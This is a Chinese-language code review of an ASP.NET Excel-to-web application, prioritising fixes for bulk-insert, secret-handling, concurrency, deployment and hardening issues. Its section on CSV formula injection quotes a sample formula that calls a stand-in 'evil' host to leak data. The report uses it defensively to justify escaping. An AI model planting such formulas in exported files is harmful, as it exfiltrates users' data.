# ExcelToWeb 代码审查报告

> 审查范围：全部后端 C# 源码（39 个文件）、前端 JS 关键路径、配置与部署面。
> 验证手段：逐文件人工审查 + `check_constraints.py` 通过 + `tests/run.py` 26 项全绿。
> 结论摘要：分层与数据隔离做得很好，无注入、无越权读取；但有 **2 个 P0**（Linux 下批量插入必坏、JWT 占位密钥已提交）会在「部署到 Azure」这一步直接引爆，建议优先处理。

## 一、严重问题（P0，必须修复，影响功能或安全）

### 问题 1：批量插入的 SQL 拼接依赖 Windows 换行符长度，Linux 下必然语法错误

- 位置：`Services/Excel/TableRepository.cs` `BulkInsertRowsAsync()` 第 197 行
- 问题描述：
  每批 VALUES 行用 `insertSql.AppendLine(...)` 拼接，结尾通过 `insertSql.Length -= 3` 去掉「逗号 + 换行」。
  `StringBuilder.AppendLine` 追加的是 `Environment.NewLine`：Windows 是 `\r\n`（2 字符），去掉「`,`+`\r\n`」恰好 3 字符，正确；
  **Linux 是 `\n`（1 字符），结尾只有「`,`+`\n`」2 字符，`Length -= 3` 会多吃掉最后一行的右括号 `)`**，SQL 变成 `...(@p1497, @p1498, @p1499` —— 语法错误。
- 风险：部署到 Azure Linux App Service / Linux 容器后，**所有 Excel 导入（核心功能）100% 失败**，且本地 Windows 开发与测试完全无法暴露。
- 修复建议（改用 `string.Join`，彻底不数换行符）：

```csharp
// TableRepository.cs BulkInsertRowsAsync 内，替换 StringBuilder 方案：
var valueRows = new List<string>(batch.Count);
var parameters = new List<SqlParameter>();
int idx = 0;
foreach (var row in batch)
{
    parameters.Add(new SqlParameter($"@p{idx}", tableId));
    parameters.Add(new SqlParameter($"@p{idx + 1}", SerializeRow(row)));
    parameters.Add(new SqlParameter($"@p{idx + 2}", DateTime.Now));
    valueRows.Add($"  (@p{idx}, @p{idx + 1}, @p{idx + 2})");
    idx += 3;
}
var insertSql = "INSERT INTO DynamicRows (TableId, DataJson, CreatedAt) VALUES\n"
              + string.Join(",\n", valueRows);
await _db.Database.ExecuteSqlRawAsync(insertSql, parameters.ToArray());
```

### 问题 2：JWT 占位密钥已提交进仓库，启动自检形同虚设

- 位置：`appsettings.json` 第 6 行；`Program.cs` 第 29 行
- 问题描述：
  `appsettings.json` 里提交了 `"Key": "CHANGE_ME__dotnet_user-secrets_set_Jwt:Key__or_env_Jwt__Key"`。
  `Program.cs` 的守卫是 `?? throw` —— 只在键**缺失**时抛出，而这个占位串是非空合法值，守卫永远哑火。
  一旦按现状部署，签名密钥就是一份公开仓库里人人可见的字符串。
- 风险：任何人可以本地伪造任意用户（含他人 UserId）的 JWT，读取/改写/删除其全部表格数据 —— 数据隔离体系整体失效。
- 修复建议（两道闸：仓库不留密钥 + 生产环境拒绝弱密钥）：

```jsonc
// appsettings.json：删除整个 Jwt:Key 行，只保留 Issuer/Audience/ExpireMinutes
```

```csharp
// Program.cs 第 29 行处替换为：
var jwtKey = builder.Configuration["Jwt:Key"]
    ?? throw new InvalidOperationException("Jwt:Key 未配置");
if (!builder.Environment.IsDevelopment() &&
    (jwtKey.StartsWith("CHANGE_ME") || jwtKey.Length < 32))
{
    throw new InvalidOperationException(
        "生产环境必须通过环境变量 Jwt__Key 提供 ≥32 字符的独立密钥");
}
```

部署侧：Azure App Service → Configuration 添加 `Jwt__Key`（双下划线映射 `Jwt:Key`）；本地开发继续用 `dotnet user-secrets set "Jwt:Key" ...`。

## 二、中等问题（P1，建议修复，影响质量或性能）

### 问题 1：上传与导入全链路无资源上限

- 位置：`Services/Excel/TableImportService.cs` `ValidateFile()` 第 144 行；`Services/Excel/ExcelSheetReader.cs` `ReadAsync()` 第 75 行
- 问题描述：`ValidateFile` 只校验扩展名，不限制文件大小、行数、列数。读取时 `file.CopyToAsync(MemoryStream)` 全量进内存，`SheetGrid.Build` 再建一份 `string[,]` 全量矩阵，随后每行序列化为一条 `nvarchar(max)` JSON 入库。之后**所有**读取路径（`GetRowsAsync` / 查询 / 导出 / 透视 / 审计 diff）都是整表加载。
- 风险：一个 30MB 的 xlsx（Kestrel 默认请求体上限内）可解压出数十万行，造成内存尖峰、数据库膨胀、后续每次查询都全表搬运 —— 多用户下直接拖垮实例。
- 修复建议：

```csharp
// TableImportService.ValidateFile 增加：
private const long MaxFileBytes = 10 * 1024 * 1024;   // 10MB
if (file.Length > MaxFileBytes) return "文件不能超过 10MB";

// ExcelSheetReader.Read 在拿到 rowCount / colCount 后增加：
const int MaxRows = 50_000;
const int MaxColumns = 200;
if (rowCount - 1 > MaxRows) throw new ExcelReadException($"数据行超过上限 {MaxRows} 行");
if (colCount > MaxColumns) throw new ExcelReadException($"列数超过上限 {MaxColumns} 列");
```

并在 README 写明「单表建议 ≤ 5 万行」的容量边界（JSON-per-row 存储的合理天花板）。

### 问题 2：整表替换保存无并发控制，存在静默丢失更新（lost update）

- 位置：`Services/ExcelService.cs` `SaveTableDataAsync()` 第 99 行 → `Services/Excel/TableRepository.cs` `ReplaceRowsAsync()` 第 117 行
- 问题描述：两个浏览器标签页同时打开同一张表：A、B 都基于旧数据编辑，A 先保存成功，B 后保存 —— B 的整表替换直接覆盖 A 的修改，**无任何提示**；审计 diff 也会把 A 的改动记成 B 的「撤销」。
- 风险：多人/多标签场景下数据静默丢失，且审计日志给出错误的归因。
- 修复建议（EF 乐观并发，改动最小）：

```csharp
// Models/DynamicTable.cs 增加：
[Timestamp] public byte[]? RowVersion { get; set; }

// TableRepository.ReplaceRowsAsync 的 SaveChangesAsync 处：
try
{
    await _db.SaveChangesAsync();
}
catch (DbUpdateConcurrencyException)
{
    await transaction.RollbackAsync();
    throw new ConcurrencyConflictException("表格刚被其他人（或另一个标签页）修改，请刷新后再保存");
}
```

配套：`Program.cs` 启动 DDL 里补 `IF COL_LENGTH('DynamicTables','RowVersion') IS NULL ALTER TABLE DynamicTables ADD RowVersion ROWVERSION;`；门面捕获该异常返回 409 语义的消息，前端收到后提示刷新。

### 问题 3：硬编码 `UseUrls` 会覆盖云平台注入的端口

- 位置：`Program.cs` 第 22 行
- 问题描述：`builder.WebHost.UseUrls("http://localhost:5185")` 优先级高于 `ASPNETCORE_URLS` 环境变量（代码注释里自己也承认）。Azure Linux 容器 / Container Apps 靠环境变量指定监听端口，硬编码后平台探活打不通，应用被认为启动失败。
- 风险：Kestrel 直连型部署（Linux 容器）无法启动；仅 Windows App Service 的 IIS 进程内托管恰好忽略此设置而幸免 —— 属于「碰巧能跑」。
- 修复建议：

```csharp
// 只在「本地开发且平台没有注入地址」时兜底
if (builder.Environment.IsDevelopment()
    && string.IsNullOrEmpty(Environment.GetEnvironmentVariable("ASPNETCORE_URLS")))
{
    builder.WebHost.UseUrls("http://localhost:5185");
}
```

### 问题 4：缺少 Dockerfile 与生产配置注入，暂不具备 Azure 部署条件

- 位置：仓库根目录（无 Dockerfile）；`appsettings.json` 连接串为 `Trusted_Connection=True`（仅 Windows 本机可用）
- 问题描述：目标平台是 Azure App Service + Azure SQL，但仓库里没有容器化产物，也没有「哪些配置必须用环境变量覆盖」的清单。
- 修复建议：新增多阶段 `Dockerfile`（.NET 10 SDK 构建 + ASP.NET 运行时），并固化环境变量清单：

```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:10.0 AS build
WORKDIR /src
COPY ExcelToWeb/ExcelToWeb.csproj ExcelToWeb/
RUN dotnet restore ExcelToWeb/ExcelToWeb.csproj
COPY . .
RUN dotnet publish ExcelToWeb/ExcelToWeb.csproj -c Release -o /app/publish

FROM mcr.microsoft.com/dotnet/aspnet:10.0
WORKDIR /app
COPY --from=build /app/publish .
EXPOSE 8080
ENTRYPOINT ["dotnet", "ExcelToWeb.dll"]
```

App Service Configuration 需配置：`ConnectionStrings__DefaultConnection`（Azure SQL 连接串）、`Jwt__Key`、`Cors__AllowedOrigins__0`。另注意 `Program.cs` 的 `AddNegotiate()` 与 `/api/auth/windows` 在 Azure 上无域环境可用，建议用配置开关（如 `Auth:EnableWindows`）包起来，避免公网暴露一个必然失败的端点。

## 三、轻微问题（P2，可选修复，代码规范类）

### 问题 1：登录 / 注册接口无速率限制
- 位置：`Controllers/AuthController.cs` `Login()` 第 71 行、`Register()` 第 31 行
- 修复：.NET 内置限流即可——`builder.Services.AddRateLimiter(o => o.AddFixedWindowLimiter("auth", opt => { opt.PermitLimit = 10; opt.Window = TimeSpan.FromMinutes(1); }))`，`app.UseRateLimiter()`，端点上加 `[EnableRateLimiting("auth")]`。否则公网上密码可被无限爆破（PBKDF2 只增加单次成本，不挡次数）。

### 问题 2：CSV 导出未防公式注入
- 位置：`Helpers/ExcelHelper.cs` `EscapeCsvValue()` 第 59 行
- 问题：只做了引号/逗号转义。单元格值以 `=`、`+`、`-`、`@` 开头时，Excel 打开 CSV 会当公式执行（`=HYPERLINK("http://evil",...)` 是经典数据外泄载体）。
- 修复：开头命中这四个字符时前缀一个单引号：
```csharp
if ("=+-@".Contains(value[0])) return $"\"'{value.Replace("\"", "\"\"")}\"";
```

### 问题 3：全项目使用 `DateTime.Now`
- 位置：`AuthController` / `TableRepository` / `AuditService` / `RuleService` / Models 默认值等十余处
- 风险：Azure 容器时区为 UTC，本地开发为 UTC+8，同一系统的 `CreatedAt` 会出现两种基准，排序与审计时间线混乱。
- 修复：统一 `DateTime.UtcNow` 落库，前端展示时转本地时区；或注入 `TimeProvider` 便于测试。

### 问题 4：删除表格遗留孤儿数据
- 位置：`Services/ExcelService.cs` `DeleteTableAsync()` 第 134 行
- 问题：级联删除只覆盖 `DynamicRows`；`AuditLogs`、`ValidationRules`（按 TableId 关联但无 FK）、以及按 UserId 存的 `ColorRules` 都残留。
- 修复：删除时在事务里一并清理：
```csharp
await _db.AuditLogs.Where(a => a.TableId == tableId).ExecuteDeleteAsync();
await _db.ValidationRules.Where(r => r.TableId == tableId).ExecuteDeleteAsync();
```

### 问题 5：空表从列表「隐身」但数据残留
- 位置：`Services/Excel/TableRepository.cs` `GetTableInfosAsync()` 第 41 行
- 问题：`Where(... && _db.DynamicRows.Any(...))` 把 0 行的表过滤掉。用户把一张表全部行删空保存后，表从列表消失，但表本体、规则、列元数据都还留在库里，成为无法访问也无法删除的孤儿。
- 修复：去掉 `Any` 过滤（推荐，语义更直白），或在保存为 0 行时物理删除该表。

### 问题 6：宣称支持 `.xls` 但 EPPlus 实际读不了
- 位置：`Services/Excel/TableImportService.cs` `ValidateFile()` 第 149 行
- 问题：白名单放行 `.xls`，而 EPPlus 只支持 OOXML（`.xlsx`），旧版二进制格式会在 `new ExcelPackage(stream)` 处抛异常，用户拿到的是「文件解析失败」这种误导性提示。
- 修复：白名单去掉 `.xls`，提示改为「请上传 .xlsx 文件（旧版 .xls 请先在 Excel 中另存为 .xlsx）」。

### 问题 7：带校验上传漏了扩展名校验
- 位置：`Services/Excel/TableImportService.cs` `ImportWithValidationAsync()` 第 157 行
- 问题：与 `ImportAsync` 不同，这里没有调用 `ValidateFile`，只查了空文件。两条入口校验口径应一致（复用 `ValidateFile`）。

### 问题 8：缺少 HTTPS 重定向与 HSTS
- 位置：`Program.cs` 中间件管道
- 修复：生产环境补 `app.UseHttpsRedirection(); app.UseHsts();`（App Service 证书在网关层终结，但加上无副作用，且防裸 Kestrel 场景）。

### 问题 9：JWT 存于 localStorage
- 位置：`wwwroot/js/api.js` 第 9 行
- 说明：XSS 一旦发生 token 即失窃。作品集项目可接受，但建议在 README 明确写出这个权衡；更稳的做法是 HttpOnly Cookie + CSRF Token（ antiforgery 当前被 `EnableAntiforgery=false` 关闭了，改 Cookie 方案时需一并打开）。

### 问题 10：旧版 SHA256 密码哈希不会在登录后升级
- 位置：`Helpers/PasswordHelper.cs` `VerifyPassword()` 第 58-74 行
- 修复：旧格式校验成功时返回「需要重哈希」信号（如 `out bool needsRehash`），登录流程里顺手改写为 PBKDF2 格式，让存量账户自动迁移，最终删掉兼容分支。

### 问题 11：透视服务的两处小瑕疵（上次单提交审查已记录）
- 位置：`Services/Excel/PivotService.cs` 第 207-214、273 行
- 说明：`CollectKeys` 全数字分支排序时重复 `TryParseNumber`（先解析成 `(key, number)` 元组再排）；`Format` 的 `_ => 0m` 兜底静默返 0，与该类「宁可报错不静默」的口径哲学相悖，建议改 `throw new ArgumentOutOfRangeException`。

## 四、架构层面建议

1. **分层与职责：未发现明显问题，且是全项目最亮眼的部分。** `ExcelService` 只做编排与异常收敛，协作类（解析/导入/导出/列结构/规则/校验/透视/审计）单一职责、单向依赖（协作类 → Repository/RuleService，门面 → 协作类），无循环依赖。「透视计算只有一份」「数值判定只有 `ExcelNumber` 一处」这类「唯一事实来源」的坚持非常专业，请在作品集讲解中重点呈现。
2. **EF Core 与数据库：N+1 未发现**（表格列表用单条 `EXISTS` 相关子查询完成，非逐表回查）；索引设计合理（`UserId`、`Username` 唯一、`(UserId, ColumnName)`、`(TableId, CreatedAt)` 都打在主查询路径上）；`DynamicRow` 级联删除正确；`ReplaceRowsAsync` / `UpdateHeadersAsync` 的显式事务边界清晰。唯一结构性风险是 **`EnsureCreated()` + 手写幂等 DDL**：没有迁移历史，模型与 DDL 可能漂移（例如 EF 8+ 对 `List<string> Headers` 的 JSON 列映射一旦调整，旧库不会跟随）。公开展示前建议切换到 EF Migrations：`dotnet ef migrations add Initial && dotnet ef database update`，把手写 DDL 全部收编进迁移，这本身也是面试加分项。
3. **JSON-per-row 存储是这个需求的合理取舍**（动态列、免迁移），但它的代价是 SQL 层不可查询、全表加载。已通过 P1-1 的行数上限把天花板钉死，建议在 README 用一句话说清「为什么选 JSON 存储、容量边界在哪」—— 主动讲 trade-off 比被问出来强得多。
4. **安全模型整体扎实**：14 处数据访问全部经 `FindTableAsync(tableId, userId)` 归属校验（已逐一 grep 核实），规则写入强制覆盖 `UserId`/`TableId` 防 IDOR，密码 PBKDF2-10 万次 + 常量时间比较，生产环境异常不泄露明细、CORS 白名单制。剩余短板集中在「密钥管理」（P0-2）与「限流」（P2-1）。
5. **EPPlus 许可证**：当前 `SetNonCommercialPersonal` 符合作品集/毕设场景；若将来任何商业用途必须购买 Polyform 商业授权或迁移到 ClosedXML —— 建议在 README 注明，体现合规意识。
6. **前端架构红线执行良好**：`currentRows` 单一数据源、视图裁剪管线 `getFilteredRows → buildDisplayRows → getPagedRows` 不改写源数据、搜索/排序/分页纯显示层，均已抽查核实。CSS 无测试覆盖是已知风险，大改前排期人工走查即可。

## 五、修复优先级清单

| 优先级 | 问题 | 文件 | 预计工作量 |
|---|---|---|---|
| P0 | 批量插入换行符截断（Linux 必坏） | Services/Excel/TableRepository.cs:197 | 0.5h |
| P0 | JWT 占位密钥入库 + 生产弱密钥自检 | appsettings.json / Program.cs:29 | 0.5h |
| P1 | 上传/导入资源上限（大小+行列数） | TableImportService.cs / ExcelSheetReader.cs | 1-2h |
| P1 | 保存的乐观并发控制（RowVersion） | Models/DynamicTable.cs / TableRepository.cs / ExcelService.cs | 2-3h |
| P1 | UseUrls 按环境条件化 | Program.cs:22 | 0.5h |
| P1 | Dockerfile + Azure 环境变量清单 + Windows Auth 开关 | 新增 Dockerfile / Program.cs | 1-2h |
| P2 | 登录注册限流 | AuthController.cs / Program.cs | 0.5h |
| P2 | CSV 公式注入转义 | Helpers/ExcelHelper.cs:59 | 0.5h |
| P2 | DateTime.Now → UtcNow | 全局十余处 | 1h |
| P2 | 删表清理孤儿审计/规则 | ExcelService.cs:134 | 0.5h |
| P2 | 空表隐身残留 / .xls 白名单 / 校验上传漏扩展名 | TableRepository.cs / TableImportService.cs | 1h |
| P2 | HTTPS 重定向 / 密码哈希自动升级 / Pivot 两处小改 | Program.cs / PasswordHelper.cs / PivotService.cs | 1h |

**建议路线**：P0 两条（1 小时内）→ P1-3 / P1-4（部署前置条件）→ P1-1 / P1-2（数据安全底线）→ P2 打包清扫 → 最后做 EF Migrations 切换。
